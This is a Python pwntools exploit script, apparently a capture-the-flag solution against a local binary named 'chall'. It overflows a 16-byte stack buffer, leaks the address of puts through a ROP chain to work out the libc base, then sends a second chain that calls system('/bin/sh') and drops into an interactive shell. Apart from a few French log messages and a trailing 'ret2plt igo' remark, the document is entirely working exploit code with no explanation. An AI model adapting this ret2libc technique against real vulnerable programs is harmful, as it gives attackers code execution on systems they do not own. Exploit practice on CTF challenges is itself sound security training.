```python
from pwn import *

elf = context.binary = ELF('./chall')
p = process('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

buffer = b"A"*16
rbp = b"B"*8

rop = ROP(elf)

rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["vacation"])
rop.dump()
print(p.recvuntil("\n"))

payload = buffer + rbp + rop.chain()
p.sendline(payload)
log.info(rop.dump())
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"L'addr de puts {hex(puts)}")

libc.address = puts - libc.symbols["puts"]
log.info(f"L'addr de la libc {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts", [next(libc.search(b"/bin/sh\x00")) ])
rop.call("system", [next(libc.search(b"/bin/sh\x00")) ])
rop.call("exit")

payload = b""
payload += buffer
payload += rbp
payload += rop.chain()
print(payload)

p.sendline(payload)
p.interactive()
```
ret2plt igo
